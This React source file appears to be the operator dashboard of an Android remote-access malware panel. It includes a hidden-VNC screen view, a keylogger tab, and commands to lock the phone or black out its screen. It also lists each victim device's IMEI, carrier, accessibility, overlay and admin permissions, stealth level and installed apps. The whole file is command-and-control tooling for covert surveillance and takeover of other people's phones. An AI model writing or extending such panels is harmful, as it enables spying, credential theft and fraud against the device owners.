import React, { useState } from 'react';
import { useStore } from '../store/useStore';
import DeviceScreen from '../components/DeviceScreen';
import { ControlPanel } from '../components/ControlPanel';
import { KeyloggerPanel } from '../components/KeyloggerPanel';
import { sendCommand } from '../services/wsService';
import type { Device } from '../types';

type RightTab = 'control' | 'keylog' | 'info';

export const DeviceControl: React.FC = () => {
  const device   = useStore((s) => s.selectedDevice());
  const viewMode = useStore((s) => s.viewMode);
  const setViewMode = useStore((s) => s.setViewMode);
  const [rightTab, setRightTab] = useState<RightTab>('control');

  if (!device) {
    return (
      <div className="flex-1 flex items-center justify-center h-full">
        <p className="text-sm text-slate-600 font-mono">Select a device</p>
      </div>
    );
  }

  return (
    <div className="flex-1 flex h-full overflow-hidden">
      {/* ── HVNC panel ───────────────────────────────────── */}
      <div
        className={`flex items-center justify-center bg-[#050507] p-3 ${
          viewMode === 'android' ? 'w-[330px] shrink-0' : 'flex-1'
        }`}
      >
        <div className={`h-full ${viewMode === 'android' ? 'w-full max-w-[310px]' : 'w-full'}`}>
          <DeviceScreen deviceId={device.id} />
        </div>
      </div>

      {/* ── Right panel ──────────────────────────────────── */}
      <div className="flex-1 flex flex-col border-l border-slate-800/70 min-w-0 overflow-hidden">
        {/* Device header bar */}
        <div className="px-4 py-2 border-b border-slate-800 shrink-0 flex items-center justify-between gap-2">
          <div className="flex items-center gap-2.5 min-w-0">
            <span className={`w-2 h-2 rounded-full shrink-0 ${
              device.status === 'online' ? 'bg-green-400 animate-pulse' : 'bg-slate-600'
            }`} />
            <span className="text-sm font-semibold text-white/80 font-mono truncate">
              {device.brand} {device.model}
            </span>
            <span className="text-xs text-slate-500 font-mono shrink-0">
              Android {device.androidVersion}
            </span>
          </div>

          <div className="flex items-center gap-1.5 shrink-0">
            <button
              onClick={() => setViewMode(viewMode === 'android' ? 'pc' : 'android')}
              className="text-[11px] px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono transition-colors"
            >
              {viewMode === 'android' ? '📱 ANDROID' : '🖥 PC'}
            </button>

            {[
              { cmd: 'HOME',           label: 'Home' },
              { cmd: 'BACK',           label: 'Back' },
              { cmd: 'LOCK_DEVICE',    label: 'Lock' },
              { cmd: 'BLACK_SCREEN_ON',label: 'Black' },
              { cmd: 'SNAP_SCREEN',    label: 'Snap' },
            ].map(({ cmd, label }) => (
              <button
                key={cmd}
                onClick={() => sendCommand(device.id, cmd)}
                className="text-[11px] px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono transition-colors"
              >
                {label}
              </button>
            ))}
          </div>
        </div>

        {/* Tab bar */}
        <div className="flex border-b border-slate-800 shrink-0">
          {(['control', 'keylog', 'info'] as RightTab[]).map((tab) => (
            <button
              key={tab}
              onClick={() => setRightTab(tab)}
              className={`px-4 py-2 text-xs font-mono uppercase tracking-wider transition-colors ${
                rightTab === tab
                  ? 'border-b border-cyan-500 text-cyan-400'
                  : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              {tab}
            </button>
          ))}
        </div>

        {/* Tab content */}
        <div className="flex-1 overflow-hidden">
          {rightTab === 'control' && <ControlPanel deviceId={device.id} />}
          {rightTab === 'keylog'  && <KeyloggerPanel deviceId={device.id} />}
          {rightTab === 'info'    && <DeviceInfoPanel device={device} />}
        </div>
      </div>
    </div>
  );
};

/* ── Device info panel ──────────────────────────────────────── */
const DeviceInfoPanel: React.FC<{ device: Device }> = ({ device }) => {
  const rows: [string, string][] = [
    ['Device ID',    device.deviceId],
    ['Model',        `${device.brand} ${device.model}`],
    ['Android',      `${device.androidVersion} (API ${device.sdkVersion})`],
    ['Battery',      `${device.batteryLevel}%${device.isCharging ? ' ⚡' : ''}`],
    ['Network',      device.networkType],
    ['IP Address',   device.ipAddress],
    ['Country',      device.country  || '—'],
    ['Operator',     device.operator || '—'],
    ['IMEI',         device.imei     || '—'],
    ['Resolution',   device.resolution || '—'],
    ['Accessibility',String(device.hasAccessibility)],
    ['Overlay',      String(device.hasOverlay)],
    ['Admin',        String(device.hasAdmin)],
    ['Battery Exempt',String(device.hasBatteryExemption)],
    ['Stealth',      String(device.stealthLevel ?? 0)],
    ['Connected',    new Date(device.connectedAt).toLocaleString()],
    ['Last Seen',    new Date(device.lastSeen).toLocaleString()],
  ];

  return (
    <div className="h-full overflow-y-auto px-4 py-3" style={{ fontFamily: 'var(--font-mono)' }}>
      <div className="space-y-0.5">
        {rows.map(([label, value]) => (
          <div key={label} className="flex items-start gap-4 py-1.5 border-b border-slate-900">
            <span className="text-[10px] text-slate-500 uppercase tracking-wide w-28 shrink-0 pt-px">{label}</span>
            <span className="text-xs text-white/70 break-all leading-relaxed">{value}</span>
          </div>
        ))}
      </div>

      {(device.installedApps?.length ?? 0) > 0 && (
        <div className="mt-4">
          <p className="text-[10px] text-slate-500 uppercase tracking-wide mb-2">
            Installed Apps ({device.installedApps.length})
          </p>
          <div className="flex flex-wrap gap-1">
            {device.installedApps.map((app) => (
              <span key={app} className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 font-mono">
                {app}
              </span>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
